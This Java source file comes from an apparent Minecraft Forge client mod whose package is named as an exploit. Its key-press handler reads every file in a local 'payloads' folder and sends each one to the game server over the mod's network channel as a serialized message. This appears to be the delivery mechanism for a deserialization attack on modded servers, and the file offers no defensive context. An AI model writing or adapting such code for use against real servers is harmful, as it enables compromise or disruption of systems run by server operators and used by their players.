package ru.pa4ok.exploit.client.event;

import cpw.mods.fml.common.eventhandler.SubscribeEvent;
import cpw.mods.fml.common.gameevent.InputEvent.KeyInputEvent;
import cpw.mods.fml.relauncher.Side;
import cpw.mods.fml.relauncher.SideOnly;
import lombok.SneakyThrows;
import ru.pa4ok.exploit.client.ClientProxy;
import ru.pa4ok.exploit.common.CommonProxy;
import ru.pa4ok.exploit.common.network.SerializeMessage;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Set;
import java.util.stream.Collectors;

public class KeyBindEvent
{
    @SneakyThrows
    @SubscribeEvent
    @SideOnly(Side.CLIENT)
    public void onKeyInputEvent(KeyInputEvent e)
    {
        if(ClientProxy.TEST_KEY.isPressed())
        {
            Set<Path> payloads = Files.list(Paths.get("./payloads"))
                    .filter(Files::isRegularFile)
                    .collect(Collectors.toSet());

            for(Path path : payloads)
            {
                byte[] content = Files.readAllBytes(path);
                CommonProxy.channel.sendToServer(new SerializeMessage(path.getFileName().toString(), content));
                Thread.sleep(1000);
            }
        }
    }
}
